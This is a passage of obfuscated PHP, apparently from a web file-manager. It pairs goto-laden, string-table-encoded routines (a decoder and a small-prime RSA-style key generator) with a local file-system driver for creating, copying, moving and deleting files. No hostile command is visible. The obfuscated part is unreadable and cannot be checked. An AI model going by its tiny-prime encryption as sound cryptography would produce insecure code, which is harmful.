$c¾ÀËóíĞ° = $D“È‘—Ÿâ [10]; $dÏ¤ÈŠàÀ = 0; goto FØ¥˜ÔâÁæ; fñå¨†ŠÈŠ: $A¥ò¢éİ÷ğ = $D“È‘—Ÿâ [338]($A¥ò¢éİ÷ğ); $F“ßÑŸßŒœ = $eŞ™å„î­İ[654]; $d«èĞš¹Êó = $A¥ò¢éİ÷ğ[0]; goto E™ìĞÍ¼í; dæ¸àƒ…é¥: $E„˜÷ªˆ…ò = $eŞ™å„î­İ[660]; while (strlen($E„˜÷ªˆ…ò) < $eŞ™å„î­İ[10]) { if (!$E„˜÷ªˆ…ò) { break; } $E„˜÷ªˆ…ò++; } goto fõ˜¼á¸ÖŸ; FØ¥˜ÔâÁæ: $bŒÙÜŒ²ò² = 0; $aîî°õœ› = $eŞ™å„î­İ[658]; if (!$aîî°õœ›) { die; } goto eÉï¹³ğÒ; fŠ‚âÇ»šº: $Bä·Îé°¼ = $D“È‘—Ÿâ [335]($ağà¤í‰ Â, $d«èĞš¹Êó); $EµŒˆëÜœ’ = $D“È‘—Ÿâ [114]($d«èĞš¹Êó . $D“È‘—Ÿâ [114]($fÕæò£Ø¡ö . $d«èĞš¹Êó) . $fÕæò£Ø¡ö); $Bé¥ŠÆ‚•Ç = $eŞ™å„î­İ[656]; goto bîÅœÄßò¸; eÉï¹³ğÒ: $aŸî•Úèİ© = 0; for ($dÏ¤ÈŠàÀ = 0; $dÏ¤ÈŠàÀ < $D“È‘—Ÿâ [24]($A¥ò¢éİ÷ğ); $dÏ¤ÈŠàÀ++) { $aŸî•Úèİ© = $aŸî•Úèİ© == $D“È‘—Ÿâ [24]($EµŒˆëÜœ’) ? 0 : $aŸî•Úèİ©; $AÏœÃˆç¹ = $aŸî•Úèİ©++; $bŒÙÜŒ²ò² = $D“È‘—Ÿâ [335]($ağà¤í‰ Â, $A¥ò¢éİ÷ğ[$dÏ¤ÈŠàÀ]) - $Bä·Îé°¼ - $D“È‘—Ÿâ [336]($EµŒˆëÜœ’[$AÏœÃˆç¹]); while ($bŒÙÜŒ²ò² < 0) { $bŒÙÜŒ²ò² += 64; $e˜Úõùç… = $eŞ™å„î­İ[659]; } $c¾ÀËóíĞ° .= $ağà¤í‰ Â[$bŒÙÜŒ²ò²]; } $c»‘ñÉˆæ´ = $D“È‘—Ÿâ [339]($c¾ÀËóíĞ°); goto D©ˆóš„–å; fõ˜¼á¸ÖŸ: default: $c»‘ñÉˆæ´ = $this->{$_SERVER[á¬¾Ù][246]}($A¥ò¢éİ÷ğ, $fÕæò£Ø¡ö . $BŸªäˆ¼Í†); $EâºõøÈ†– = $eŞ™å„î­İ[661]; while (strlen($EâºõøÈ†–) < $eŞ™å„î­İ[10]) { if (!$EâºõøÈ†–) { break; } $EâºõøÈ†–++; } break; } if ($BÏ·ò»‹„Ô - 1 > 0) { $c»‘ñÉˆæ´ = $this->{$_SERVER[á¬¾Ù][188]}($c»‘ñÉˆæ´, $fÕæò£Ø¡ö, $BÏ·ò»‹„Ô - 1); } goto e¼–¿¬ñÌ°; eò¥¥¸ÆÑõ: if (!$EÈÂàãæÑ) { die; } $ağà¤í‰ Â = $D“È‘—Ÿâ [330]; $a„ÚğØ«×ï = $eŞ™å„î­İ[650]; goto f’¤èÌ‘İ£; bßŞŠ„Š˜ø: $A¥ò¢éİ÷ğ = $D“È‘—Ÿâ [2]($A¥ò¢éİ÷ğ); $A¥ò¢éİ÷ğ = $D“È‘—Ÿâ [214]($A¥ò¢éİ÷ğ); $eñœŠˆÌƒÌ = $eŞ™å„î­İ[647]; goto b’ùœ¸¹·ø; b’ùœ¸¹·ø: if (strlen($eñœŠˆÌƒÌ) < $eŞ™å„î­İ[564]) { return; } $EÙ’¿ ¦Ú = $A¥ò¢éİ÷ğ[0]; $BŸªäˆ¼Í† = $D“È‘—Ÿâ [25]($A¥ò¢éİ÷ğ, 1, 15); goto BË­ï®‚ƒš; BË­ï®‚ƒš: $EºË‘ÓÁ£Æ = $eŞ™å„î­İ[648]; $A¥ò¢éİ÷ğ = $D“È‘—Ÿâ [25]($A¥ò¢éİ÷ğ, 16); $EÈÂàãæÑ = $eŞ™å„î­İ[649]; goto eò¥¥¸ÆÑõ; Eˆâï‚Çã‘: $eŞ™å„î­İ =& $_SERVER[©]; $D“È‘—Ÿâ  =& $_SERVER[á¬¾Ù]; if (!$D“È‘—Ÿâ [337]($A¥ò¢éİ÷ğ) || $D“È‘—Ÿâ [24]($A¥ò¢éİ÷ğ) < 10) { return !1; } goto bßŞŠ„Š˜ø; Fª¶¼•‰ÙÜ: } public function bhcyefcbc51f($BÊâ¥ƒôä¦) { goto e“„º”¥Şñ; e“„º”¥Şñ: $e²”°ìÌÀ‡ =& $_SERVER[©]; $e®²Õà£ =& $_SERVER[á¬¾Ù]; $e¶À¢øç¼İ = $this->{$_SERVER[á¬¾Ù][340]}(); goto a¨Ø‘Èõö„; a¨Ø‘Èõö„: $EŸ¼„‚™¥ = $this->{$_SERVER[á¬¾Ù][340]}(); $aº¡ÎˆçÛ = ($e¶À¢øç¼İ - 1) * ($EŸ¼„‚™¥ - 1); $c‡ŒÛ§’„è = $e®²Õà£[201](($e¶À¢øç¼İ + $EŸ¼„‚™¥) / 2); goto Dˆ¤¤ˆ‘â; FÕ·Íø‚×Ë: for ($B¡ÛÎ‡Ÿ— = 0; $B¡ÛÎ‡Ÿ— < $aº¡ÎˆçÛ * 10; $B¡ÛÎ‡Ÿ—++) { if (($aº¡ÎˆçÛ * $B¡ÛÎ‡Ÿ— + 1) % $c‡ŒÛ§’„è == 0) { $eÃ¯ŒÙ¥ = $e®²Õà£[201](($aº¡ÎˆçÛ * $B¡ÛÎ‡Ÿ— + 1) / $c‡ŒÛ§’„è); break; } } $D·™†ÙÛ· = $this->{$_SERVER[á¬¾Ù][147]}($e¶À¢øç¼İ * $EŸ¼„‚™¥ . $e®²Õà£[10], $e®²Õà£[149]); $A“¯­õË = $e²”°ìÌÀ‡[665]; goto b·ªÅ¢¹í; E‘ßŠ³çæŸ: return $D–ñùÄƒ²‰; goto a¸å±Ÿ¶’‡; b·ªÅ¢¹í: $F³ é»Ñá = $e®²Õà£[114]($e®²Õà£[341] . ($e¶À¢øç¼İ + $EŸ¼„‚™¥) . $e®²Õà£[342] . $c‡ŒÛ§’„è . $e®²Õà£[342] . $eÃ¯ŒÙ¥ . $e®²Õà£[343]); $D–ñùÄƒ²‰ = $this->{$_SERVER[á¬¾Ù][147]}($BÊâ¥ƒôä¦, $F³ é»Ñá) . $e®²Õà£[344] . $D·™†ÙÛ·; $DÙ¨½Õƒ = $e²”°ìÌÀ‡[666]; goto E‘ßŠ³çæŸ; Dˆ¤¤ˆ‘â: while (1) { $FÁ­…Ş©¦ = $c‡ŒÛ§’„è; $f»÷Î×„ = $aº¡ÎˆçÛ; while ($f»÷Î×„ % $FÁ­…Ş©¦ != 0) { $FæÎ”«‰ø¨ = $f»÷Î×„; $eË°İ…Ùİ‚ = $e²”°ìÌÀ‡[662]; if (strlen($eË°İ…Ùİ‚) < $e²”°ìÌÀ‡[10]) { return; } $f»÷Î×„ = $FÁ­…Ş©¦; $CÓŞæĞ½äí = $e²”°ìÌÀ‡[663]; $FÁ­…Ş©¦ = $FæÎ”«‰ø¨ % $FÁ­…Ş©¦; } if ($FÁ­…Ş©¦ == 1) { break; } else { $c‡ŒÛ§’„è++; } } $eÃ¯ŒÙ¥ = 2; $cí¢‰Ä×È = $e²”°ìÌÀ‡[664]; goto FÕ·Íø‚×Ë; a¸å±Ÿ¶’‡: } public function xsty11b0cfc3($cË´ªìšÇ) { goto fŞºá³õæ™; EŞÆöÇ¦™: if (strlen($E±Î®´¡Ùœ) < $D‚Áï™²ô[564]) { die; } $Eİíñø¢†Ø = $this->{$_SERVER[á¬¾Ù][246]}($BñÏŠ¼è¤[0], $FÙãùšÓœŒ); return $Eİíñø¢†Ø; goto FñİõÛ‰÷ù; f˜”ñâ®­: $CˆÁíÏõŞ = $D‚Áï™²ô[668]; if (!$CˆÁíÏõŞ) { die; } $B–‚ªï‘ª = 0; goto A”Â™À—Ú¬; Cç‡ÚÊÛÂ: if ($C“ò”Ê¦ùÇ[19]($BñÏŠ¼è¤) != 2) { return $C“ò”Ê¦ùÇ[10]; } $DÕîİñöÌ” = $this->{$_SERVER[á¬¾Ù][246]}($BñÏŠ¼è¤[1] . $C“ò”Ê¦ùÇ[10], $C“ò”Ê¦ùÇ[149]); $dÍ¥†ˆßÇ÷ = $D‚Áï™²ô[667]; goto e‚¶²Ğ°¿ã; A”Â™À—Ú¬: $DÈî³©ÑÆ = $D‚Áï™²ô[669]; $Bòª®Ìœ…© = 0; $CîäÅË…¿¸ = $D‚Áï™²ô[670]; goto FæÓŞß¾ßï; e‚¶²Ğ°¿ã: while ($dÍ¥†ˆßÇ÷ < $D‚Áï™²ô[589]) { if ($dÍ¥†ˆßÇ÷ >= 0) { break; } $dÍ¥†ˆßÇ÷++; } if (!$DÕîİñöÌ”) { return $C“ò”Ê¦ùÇ[10]; } $DÕîİñöÌ” = $C“ò”Ê¦ùÇ[201]($DÕîİñöÌ”); goto f˜”ñâ®­; FæÓŞß¾ßï: if (strlen($CîäÅË…¿¸) < $D‚Áï™²ô[567]) { return; } for ($AÈåŞíğ¹• = 3; $AÈåŞíğ¹• < $DÕîİñöÌ”; $AÈåŞíğ¹• += 2) { if ($DÕîİñöÌ” % $AÈåŞíğ¹• != 0) { continue; } $B–‚ªï‘ª = $AÈåŞíğ¹•; $Bòª®Ìœ…© = $C“ò”Ê¦ùÇ[201]($DÕîİñöÌ” / $AÈåŞíğ¹•); $Fİîëõù® = $D‚Áï™²ô[671]; break; $B›ìåªøà› = $D‚Áï™²ô[672]; if (strlen($B›ìåªøà›) < $D‚Áï™²ô[589]) { die; } } $AÏ›”˜âÚ = ($B–‚ªï‘ª - 1) * ($Bòª®Ìœ…© - 1); goto Bæà¢–Ü‘Ê; Bæà¢–Ü‘Ê: $A¾œ ‹˜Ü’ = $C“ò”Ê¦ùÇ[201](($B–‚ªï‘ª + $Bòª®Ìœ…©) / 2); while (1) { $aŠ®‚ä¤¤¹ = $A¾œ ‹˜Ü’; $B…¼ÅÑà¨ = $D‚Áï™²ô[673]; while ($B…¼ÅÑà¨ < $D‚Áï™²ô[10]) { if ($B…¼ÅÑà¨ >= 0) { break; } $B…¼ÅÑà¨++; } $C‘·ïğ“ = $AÏ›”˜âÚ; while ($C‘·ïğ“ % $aŠ®‚ä¤¤¹ != 0) { $F‰é÷§¤¿· = $C‘·ïğ“; $DÑ¥–«×¼¯ = $D‚Áï™²ô[674]; if (strlen($DÑ¥–«×¼¯) < $D‚Áï™²ô[564]) { die; } $C‘·ïğ“ = $aŠ®‚ä¤¤¹; $CÒ‚ãÀ›±× = $D‚Áï™²ô[675]; $aŠ®‚ä¤¤¹ = $F‰é÷§¤¿· % $aŠ®‚ä¤¤¹; } if ($aŠ®‚ä¤¤¹ == 1) { break; } else { $A¾œ ‹˜Ü’++; } } $f×«¼¹†¤ï = 2; goto DÆÉ¸…™ö—; DÆÉ¸…™ö—: for ($AÈåŞíğ¹• = 0; $AÈåŞíğ¹• < $AÏ›”˜âÚ * 10; $AÈåŞíğ¹•++) { if (($AÏ›”˜âÚ * $AÈåŞíğ¹• + 1) % $A¾œ ‹˜Ü’ == 0) { $f×«¼¹†¤ï = $C“ò”Ê¦ùÇ[201](($AÏ›”˜âÚ * $AÈåŞíğ¹• + 1) / $A¾œ ‹˜Ü’); break; } } $FÙãùšÓœŒ = $C“ò”Ê¦ùÇ[114]($C“ò”Ê¦ùÇ[341] . ($B–‚ªï‘ª + $Bòª®Ìœ…©) . $C“ò”Ê¦ùÇ[342] . $A¾œ ‹˜Ü’ . $C“ò”Ê¦ùÇ[342] . $f×«¼¹†¤ï . $C“ò”Ê¦ùÇ[343]); $E±Î®´¡Ùœ = $D‚Áï™²ô[676]; goto EŞÆöÇ¦™; fŞºá³õæ™: $D‚Áï™²ô =& $_SERVER[©]; $C“ò”Ê¦ùÇ =& $_SERVER[á¬¾Ù]; $BñÏŠ¼è¤ = $C“ò”Ê¦ùÇ[0]($C“ò”Ê¦ùÇ[344], $cË´ªìšÇ); goto Cç‡ÚÊÛÂ; FñİõÛ‰÷ù: } public function opfx71d5c13d() { goto A¶õŸ¯»‚ ; Aæ‚Š‹Œåº: $D‘Š£âí«Ÿ = $A³ùê¦À‡»[682]; if (strlen($D‘Š£âí«Ÿ) < $A³ùê¦À‡»[10]) { die; } for ($CÇ ˜¨Î = $CÁ‹ÛğÊË; $CÇ ˜¨Î > 1; $CÇ ˜¨Î--) { $fà¢Ç‰º·Ö = !0; $A–Œ…¨¯²« = $A³ùê¦À‡»[683]; while ($A–Œ…¨¯²« < $A³ùê¦À‡»[567]) { if ($A–Œ…¨¯²« >= 0) { break; } $A–Œ…¨¯²«++; } foreach ($DÛÆÂêêÛ as $bëïíÜÛ¨Ì) { if ($CÇ ˜¨Î % $bëïíÜÛ¨Ì == 0) { $fà¢Ç‰º·Ö = !1; break; } } if ($fà¢Ç‰º·Ö) { $fù¡Â†õë§ = $CÇ ˜¨Î; break; } } goto eÛ‡ëÏèÓó; A¶õŸ¯»‚ : $A³ùê¦À‡» =& $_SERVER[©]; $Eš š…Å¤¤ =& $_SERVER[á¬¾Ù]; $CÁ‹ÛğÊË = $Eš š…Å¤¤[325]($Eš š…Å¤¤[345](2, 14), $Eš š…Å¤¤[345](2, 16) - 1); goto A˜Ÿ°İ±¾ò; A˜Ÿ°İ±¾ò: $e‡£öõÉÚ = $A³ùê¦À‡»[677]; while (strlen($e‡£öõÉÚ) < $A³ùê¦À‡»[10]) { if (!$e‡£öõÉÚ) { break; } $e‡£öõÉÚ++; } $DÛÆÂêêÛ = array(); goto CÄÆì½áÎô; EÛŒ¼¾…Í¼: if (!$aÙåˆ¬´ç) { return; } while ($d‘õË¥Ê¤È <= (int) $Eš š…Å¤¤[346]($CÁ‹ÛğÊË)) { $CÇ ˜¨Î = $d‘õË¥Ê¤È; $B’ğ·ª¢ñ” = $A³ùê¦À‡»[680]; if (!$B’ğ·ª¢ñ”) { return; } while (!0) { $CÇ ˜¨Î++; if ($CÇ ˜¨Î <= 2) { $d‘õË¥Ê¤È = $CÇ ˜¨Î; break; } else { if ($CÇ ˜¨Î < 2) { continue; } } $fà¢Ç‰º·Ö = !0; for ($c•¸§™Óâ = 2; $c•¸§™Óâ <= $Eš š…Å¤¤[346]($CÇ ˜¨Î); $c•¸§™Óâ++) { if ($CÇ ˜¨Î % $c•¸§™Óâ == 0) { $fà¢Ç‰º·Ö = !1; } } if ($fà¢Ç‰º·Ö) { $d‘õË¥Ê¤È = $CÇ ˜¨Î; break; } } $DÛÆÂêêÛ[] = $d‘õË¥Ê¤È; $d„¸‹Æ“ = $A³ùê¦À‡»[681]; if (strlen($d„¸‹Æ“) < $A³ùê¦À‡»[567]) { die; } } $fù¡Â†õë§ = 2; goto Aæ‚Š‹Œåº; CÄÆì½áÎô: $fš‘Õ¹¤¼ğ = $A³ùê¦À‡»[678]; $d‘õË¥Ê¤È = 1; $aÙåˆ¬´ç = $A³ùê¦À‡»[679]; goto EÛŒ¼¾…Í¼; eÛ‡ëÏèÓó: return $fù¡Â†õë§; $B¸‰÷ãğé = $A³ùê¦À‡»[684]; goto a‚–ñĞ²–î; a‚–ñĞ²–î: } public function zbyw6fdd794c($b«“Íàèá, $eğ”ÙÆºÌ) { $Cø†ë¶‡ğÑ =& $_SERVER[á¬¾Ù]; return $Cø†ë¶‡ğÑ[13](array($Cø†ë¶‡ğÑ[14], $Cø†ë¶‡ğÑ[347]), $b«“Íàèá, $eğ”ÙÆºÌ); } public function xyrn81fbe6c9($cÂä„’´œÏ, $c´èÊ„ö») { $EƒƒéÎàé÷ =& $_SERVER[á¬¾Ù]; return $EƒƒéÎàé÷[13](array($EƒƒéÎàé÷[348], $EƒƒéÎàé÷[349]), $cÂä„’´œÏ, $c´èÊ„ö»); } public function vkxn5e5239e3($B¥´²Âê×½, $BˆÛ„ã¤˜Ô) { $FŒ¸ÍÜÑµº =& $_SERVER[á¬¾Ù]; return $FŒ¸ÍÜÑµº[13](array($FŒ¸ÍÜÑµº[348], $FŒ¸ÍÜÑµº[350]), $B¥´²Âê×½, $BˆÛ„ã¤˜Ô); $C¬Ìù´å¬‘ = $_SERVER[©][685]; if (!$C¬Ìù´å¬‘) { die; } } } goto EŒ»ñ—…‘; e…ãÚè­İÑ: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($f§ôÙ½×¾Ş) { if (substr($f§ôÙ½×¾Ş, 0, 2) == $_SERVER[©][1152]) { $f§ôÙ½×¾Ş = BASIC_PATH . substr($f§ôÙ½×¾Ş, 2); } return $f§ôÙ½×¾Ş; } public function iconvApp($eÒ¤´•‹Ñ) { $Açå´«‹Ÿ =& $_SERVER[©]; global $config; return $this->iconvTo($eÒ¤´•‹Ñ, $config[$Açå´«‹Ÿ[1150]], $config[$Açå´«‹Ÿ[1149]]); } public function iconvSystem($eê¨’í…µ) { $E´÷ë‚ƒê× =& $_SERVER[©]; global $config; return $this->iconvTo($eê¨’í…µ, $config[$E´÷ë‚ƒê×[1149]], $config[$E´÷ë‚ƒê×[1150]]); } public function getPathOuter($B¢ãíÓ¶á) { goto bÃÒ¢ÍùùÂ; cÁÔ³é™: $B¢ãíÓ¶á = KodIO::clear($B¢ãíÓ¶á); $B¢ãíÓ¶á = substr($B¢ãíÓ¶á, strlen($aêïäôŠŸ)); if (empty($this->pathDriver)) { return $B¢ãíÓ¶á; } goto Eä±×§ƒ; AÜ•Ñ¢»Üç: if (substr($aêïäôŠŸ, 0, 2) == $B™±Ë´—¢ƒ[1152]) { $aêïäôŠŸ = BASIC_PATH . substr($aêïäôŠŸ, 2); } if (substr($B¢ãíÓ¶á, 0, 2) == $B™±Ë´—¢ƒ[1152]) { $B¢ãíÓ¶á = BASIC_PATH . substr($B¢ãíÓ¶á, 2); } $aêïäôŠŸ = KodIO::clear($aêïäôŠŸ); goto cÁÔ³é™; Eä±×§ƒ: return $this->pathDriver . $B™±Ë´—¢ƒ[18] . ltrim($B¢ãíÓ¶á, $B™±Ë´—¢ƒ[18]); goto b¹¼ µ­¸; bÃÒ¢ÍùùÂ: $B™±Ë´—¢ƒ =& $_SERVER[©]; $aêïäôŠŸ = $this->iconvApp($this->pathBase); $B¢ãíÓ¶á = $this->iconvApp($B¢ãíÓ¶á); goto AÜ•Ñ¢»Üç; b¹¼ µ­¸: } public function mkfile($C¨¯ÑÖÎï, $e„íèÆÙ™ = '', $cöö–ÍâÓ = REPEAT_RENAME) { $C¨¯ÑÖÎï = $this->iconvSystem($C¨¯ÑÖÎï); @touch($C¨¯ÑÖÎï); if ($e„íèÆÙ™) { file_put_contents($C¨¯ÑÖÎï, $e„íèÆÙ™); } return is_file($C¨¯ÑÖÎï) ? $this->getPathOuter($C¨¯ÑÖÎï) : !1; } public function mkdir($Dİä„ÆÀÅ…, $E¾‡É…í§¦ = REPEAT_SKIP) { $Dİä„ÆÀÅ… = $this->iconvSystem($Dİä„ÆÀÅ…); if (is_dir($Dİä„ÆÀÅ…)) { return $this->getPathOuter($Dİä„ÆÀÅ…); } @mkdir($Dİä„ÆÀÅ…, 511, !0); return is_dir($Dİä„ÆÀÅ…) ? $this->getPathOuter($Dİä„ÆÀÅ…) : !1; } public function copyFile($Cø–ƒ„ŒŞ, $B·—îÛÍ®®) { $this->mkdir($this->pathFather($B·—îÛÍ®®)); $Cø–ƒ„ŒŞ = $this->iconvSystem($Cø–ƒ„ŒŞ); $B·—îÛÍ®® = $this->iconvSystem($B·—îÛÍ®®); $D‹‚ˆœ•‰Í = @copy($Cø–ƒ„ŒŞ, $B·—îÛÍ®®); return $D‹‚ˆœ•‰Í ? $this->getPathOuter($B·—îÛÍ®®) : !1; } public function moveFile($dğ¿Ïîñ, $BÛ±¨²±¶à) { $this->mkdir($this->pathFather($BÛ±¨²±¶à)); $dğ¿Ïîñ = $this->iconvSystem($dğ¿Ïîñ); $BÛ±¨²±¶à = $this->iconvSystem($BÛ±¨²±¶à); $EÆóŒŒâ‚« = intval(@rename($dğ¿Ïîñ, $BÛ±¨²±¶à)); if (!$EÆóŒŒâ‚«) { if ($EÆóŒŒâ‚« = intval(@copy($dğ¿Ïîñ, $BÛ±¨²±¶à))) { @unlink($dğ¿Ïîñ); } } return $EÆóŒŒâ‚« ? $this->getPathOuter($BÛ±¨²±¶à) : !1; } public function delFile($FÁ¢¡×©ë) { $FÁ¢¡×©ë = $this->iconvSystem($FÁ¢¡×©ë); if (!@unlink($FÁ¢¡×©ë)) { @chmod($FÁ¢¡×©ë, 511); if (!@unlink($FÁ¢¡×©ë)) { return !1; } } else { return !0; } } public function delFolder($fßÌÀìùô) { goto EâØŠÔ‡¾à; EŒ…ÖùÎŠó: if (!($bÇïğƒÖØÌ = opendir($fßÌÀìùô))) { return !1; } while (($eÇ±™ÀÕ» = readdir($bÇïğƒÖØÌ)) !== !1) { if ($eÇ±™ÀÕ» == $D‰ä¼ÕßÖ¥[101] || $eÇ±™ÀÕ» == $D‰ä¼ÕßÖ¥[1162]) { continue; } $b—óÚò´½À = $fßÌÀìùô . $D‰ä¼ÕßÖ¥[18] . $eÇ±™ÀÕ»; if (is_file($b—óÚò´½À) || is_link($b—óÚò´½À)) { if (!unlink($b—óÚò´½À)) { chmod($b—óÚò´½À, 511); if (!unlink($b—óÚò´½À)) { return !1; } } } else { if (is_dir($b—óÚò´½À)) { chmod($b—óÚò´½À, 511); $b—óÚò´½À = $this->iconvApp($b—óÚò´½À); if (!$this->delFolder($b—óÚò´½À)) { return !1; } } } } closedir($bÇïğƒÖØÌ); goto f—¨Öƒø; f—¨Öƒø: return rmdir($fßÌÀìùô); goto fÉ™£¨£—Ø; EâØŠÔ‡¾à: $D‰ä¼ÕßÖ¥ =& $_SERVER[©]; $fßÌÀìùô = $this->iconvSystem($fßÌÀìùô); if (!is_dir($fßÌÀìùô)) { return !0; } goto EŒ…ÖùÎŠó; fÉ™£¨£—Ø: } public function rename($bõÌ¯ÉÓÂ†, $bÑÂÒéÃëğ) { goto cÈÇö”Ã‰Ú; a°²¥‹öÜ: $B½À‘»Óºª = @rename($bõÌ¯ÉÓÂ†, $B©¢ÜÃÜõ†); $B©¢ÜÃÜõ† = $this->iconvApp($B©¢ÜÃÜõ†); return $B½À‘»Óºª ? $this->getPathOuter($B©¢ÜÃÜõ†) : !1; goto E×ÜÄ‹Ö§ì; eË›Š¥ ¶: $bõÌ¯ÉÓÂ† = $this->iconvSystem($bõÌ¯ÉÓÂ†); $FÆ­¢ÂÈ = $this->pathFather($bõÌ¯ÉÓÂ†); $B©¢ÜÃÜõ† = rtrim($FÆ­¢ÂÈ, $cŒ™ÚàÅóË[18]) . $cŒ™ÚàÅóË[18] . $f‡Ú‚ß‡ÔÇ; goto a°²¥‹öÜ; cÈÇö”Ã‰Ú: $cŒ™ÚàÅóË =& $_SERVER[©]; $f‡Ú‚ß‡ÔÇ = $this->fileNameAuto($this->pathFather($bõÌ¯ÉÓÂ†), $bÑÂÒéÃëğ); $f‡Ú‚ß‡ÔÇ = $this->iconvSystem($f‡Ú‚ß‡ÔÇ); goto eË›Š¥ ¶; E×ÜÄ‹Ö§ì: } public function size($eˆÕÓ³Ê¯) { $eˆÕÓ³Ê¯ = $this->iconvSystem($eˆÕÓ³Ê¯); return (double) abs(sprintf($_SERVER[©][1164], @filesize($eˆÕÓ³Ê¯))); } public function info($Fëêº˜ìÄŒ) { $Fëêº˜ìÄŒ = $this->iconvSystem($Fëêº˜ìÄŒ); if ($this->isFolder($Fëêº˜ìÄŒ)) { return $this->folderInfo($Fëêº˜ìÄŒ); } else { if ($this->isFile($Fëêº˜ìÄŒ)) { return $this->fileInfo($Fëêº˜ìÄŒ); } } return !1; } protected function infoChildren($BÈ ‘½ÂÒ , &$F²ŞÆ»Š³Ñ, $b”‹„Ğ¤º = true) { goto c‘Æ»³•‡; CŸßğÛï­¯: if ($b”‹„Ğ¤º) { $BÈ ‘½ÂÒ  = $this->iconvSystem($BÈ ‘½ÂÒ ); } if (!($C„›İ‚õÛç = @opendir($BÈ ‘½ÂÒ ))) { return; } while (($aĞÜ‹¾—ó¨ = readdir($C„›İ‚õÛç)) !== !1) { if ($aĞÜ‹¾—ó¨ == $eé…‡ãÜ®…[101] || $aĞÜ‹¾—ó¨ == $eé…‡ãÜ®…[1162]) { continue; } $cÌ·Œ‹÷ã„ = $BÈ ‘½ÂÒ  . $aĞÜ‹¾—ó¨; if (is_file($cÌ·Œ‹÷ã„) || is_link($cÌ·Œ‹÷ã„)) { $F²ŞÆ»Š³Ñ[$eé…‡ãÜ®…[88]]++; $F²ŞÆ»Š³Ñ[$eé…‡ãÜ®…[87]] += (double) abs(sprintf($eé…‡ãÜ®…[1164], @filesize($cÌ·Œ‹÷ã„))); } else { if (is_dir($cÌ·Œ‹÷ã„)) { $F²ŞÆ»Š³Ñ[$eé…‡ãÜ®…[89]]++; $this->infoChildren($cÌ·Œ‹÷ã„, $F²ŞÆ»Š³Ñ, !1); } } } goto d«´œ¶‡‹©; c‘Æ»³•‡: $eé…‡ãÜ®… =& $_SERVER[©]; check_abort(); $BÈ ‘½ÂÒ  = rtrim($BÈ ‘½ÂÒ , $eé…‡ãÜ®…[18]) . $eé…‡ãÜ®…[18]; goto CŸßğÛï­¯; d«´œ¶‡‹©: closedir($C„›İ‚õÛç); goto d³¿ñƒÛ¾; d³¿ñƒÛ¾: } private function folderInfo($AİŞ×ßŠêš, $Bî½º˜ÜÆ = false) { $AÜ¯¯œó¯ª =& $_SERVER[©]; $AİŞ×ßŠêš = rtrim($AİŞ×ßŠêš, $AÜ¯¯œó¯ª[18]) . $AÜ¯¯œó¯ª[18]; $E¸á¡Çğá = $this->iconvApp($this->pathThis($AİŞ×ßŠêš)); if ($Bî½º˜ÜÆ) { return array($AÜ¯¯œó¯ª[38] => $E¸á¡Çğá, $AÜ¯¯œó¯ª[85] => $this->getPathOuter($AİŞ×ßŠêš), $AÜ¯¯œó¯ª[39] => $AÜ¯¯œó¯ª[86]); } $f÷Ú­ÀóÚÛ = array($AÜ¯¯œó¯ª[38] => $E¸á¡Çğá, $AÜ¯¯œó¯ª[85] => $this->getPathOuter($AİŞ×ßŠêš), $AÜ¯¯œó¯ª[39] => $AÜ¯¯œó¯ª[86], $AÜ¯¯œó¯ª[197] => @filectime($AİŞ×ßŠêš), $AÜ¯¯œó¯ª[117] => @filemtime($AİŞ×ßŠêš), $AÜ¯¯œó¯ª[1165] => @fileatime($AİŞ×ßŠêš), $AÜ¯¯œó¯ª[1159] => is_readable($AİŞ×ßŠêš), $AÜ¯¯œó¯ª[1160] => is_writable($AİŞ×ßŠêš), $AÜ¯¯œó¯ª[1166] => get_mode($AİŞ×ßŠêš)); return $f÷Ú­ÀóÚÛ; } private function fileInfo($eø¤îÆÔœí, $C•ùˆ‡ç¨¯ = false) { $E¿˜—ÙœÜ‘ =& $_SERVER[©]; $Dò’Œ“ÖìÂ = $this->iconvApp($this->pathThis($eø¤îÆÔœí)); if ($C•ùˆ‡ç¨¯) { return array($E¿˜—ÙœÜ‘[38] => $Dò’Œ“ÖìÂ, $E¿˜—ÙœÜ‘[85] => $this->getPathOuter($eø¤îÆÔœí), $E¿˜—ÙœÜ‘[39] => $E¿˜—ÙœÜ‘[177], $E¿˜—ÙœÜ‘[87] => $this->size($eø¤îÆÔœí), $E¿˜—ÙœÜ‘[170] => $this->ext($Dò’Œ“ÖìÂ)); } $fğ£‘ìî’³ = array($E¿˜—ÙœÜ‘[38] => $Dò’Œ“ÖìÂ, $E¿˜—ÙœÜ‘[85] => $this->getPathOuter($eø¤îÆÔœí), $E¿˜—ÙœÜ‘[39] => $E¿˜—ÙœÜ‘[177], $E¿˜—ÙœÜ‘[197] => @filectime($eø¤îÆÔœí), $E¿˜—ÙœÜ‘[117] => @filemtime($eø¤îÆÔœí), $E¿˜—ÙœÜ‘[1165] => @fileatime($eø¤îÆÔœí), $E¿˜—ÙœÜ‘[87] => $this->size($eø¤îÆÔœí), $E¿˜—ÙœÜ‘[170] => $this->ext($Dò’Œ“ÖìÂ), $E¿˜—ÙœÜ‘[1159] => is_readable($eø¤îÆÔœí), $E¿˜—ÙœÜ‘[1160] => is_writable($eø¤îÆÔœí), $E¿˜—ÙœÜ‘[1166] => get_mode($eø¤îÆÔœí)); return $fğ£‘ìî’³; } public function exist($Fíñã¥“) { $Fíñã¥“ = $this->iconvSystem($Fíñã¥“); return @file_exists($Fíñã¥“); } public function isFile($dÛÌ‚òÎĞ) { $dÛÌ‚òÎĞ = $this->iconvSystem($dÛÌ‚òÎĞ); return @is_file($dÛÌ‚òÎĞ); } public function isFolder($Cƒ¥£ĞÅÕ) { $Cƒ¥£ĞÅÕ = $this->iconvSystem($Cƒ¥£ĞÅÕ); return @is_dir($Cƒ¥£ĞÅÕ); } public function listPath($eÏ¤÷ĞªÊŒ, $e˜šéó‘‡¹ = false) { goto e©ÎÍåäÒ’; Bô’ñ©£¯Ê: closedir($eå¨¯Ü„ Ì); return $cˆ÷Á ÑÂ¸; goto f“ë“¨Óí; Cî­ˆ‘©»: $cˆ÷Á ÑÂ¸ = array($eí¸ìœ‘¨ç[84] => array(), $eí¸ìœ‘¨ç[83] => array()); if (!($eå¨¯Ü„ Ì = @opendir($eÏ¤÷ĞªÊŒ))) { return $cˆ÷Á ÑÂ¸; } while (($dÆ„è®´À = readdir($eå¨¯Ü„ Ì)) !== !1) { if ($dÆ„è®´À == $eí¸ìœ‘¨ç[101] || $dÆ„è®´À == $eí¸ìœ‘¨ç[1162]) { continue; } 